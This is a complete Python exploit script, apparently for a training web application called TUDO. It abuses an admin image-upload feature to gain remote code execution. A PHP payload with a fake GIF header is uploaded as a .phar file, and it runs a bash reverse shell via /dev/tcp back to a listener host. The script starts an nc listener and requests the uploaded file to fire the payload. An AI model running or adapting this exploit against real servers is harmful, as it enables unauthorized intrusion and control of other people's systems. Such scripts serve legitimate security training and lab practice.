# TUDO Remote Code Execution #2 - "imageUpload"
# William Moody
# December 22, 2025

import requests
import argparse
import subprocess
import random
import string

# Parse arguments
parser = argparse.ArgumentParser(description="Exploits image upload feature to get RCE")
parser.add_argument("target",help="Target URL")
parser.add_argument("cookie",help="Admin cookie")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="9999")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Upload .phar "image"
random_filename = "".join(random.choice(string.ascii_letters) for i in range(8)) + ".phar"
php_payload = f"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'\");"
image_payload = f"GIF87a<?php {php_payload} ?>"
r = requests.post(
    f"{args.target}/admin/upload_image.php",
    files={"title":(None, "POC"), "image":(random_filename, image_payload, "image/gif")},
    headers={"cookie":args.cookie}
)
print(f"[*] Uploaded image/payload ({random_filename})")

# Start listener
print("[*] Starting listener...")
subprocess.Popen(["nc","-nvlp", f"{args.lport}"])

# Trigger payload by visiting the image/payload
requests.get(f"{args.target}/images/{random_filename}")

# Keep shell open
while True:
    pass